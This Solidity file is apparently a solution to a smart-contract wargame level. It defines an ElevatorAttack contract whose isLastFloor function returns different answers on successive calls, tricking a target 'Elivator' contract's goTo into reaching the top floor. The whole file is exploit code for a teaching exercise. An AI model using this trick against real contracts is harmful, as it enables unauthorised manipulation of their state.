//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

interface Elivator {
	function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
	mapping(uint256 => uint256) public floorCount;

	function isLastFloor(uint256 _floor) external returns (bool) {
		floorCount[_floor] += 1;
		return floorCount[_floor] > 1;
	}

	function attack(address elivatorAddress) external {
		Elivator(elivatorAddress).goTo(100);
	}
}
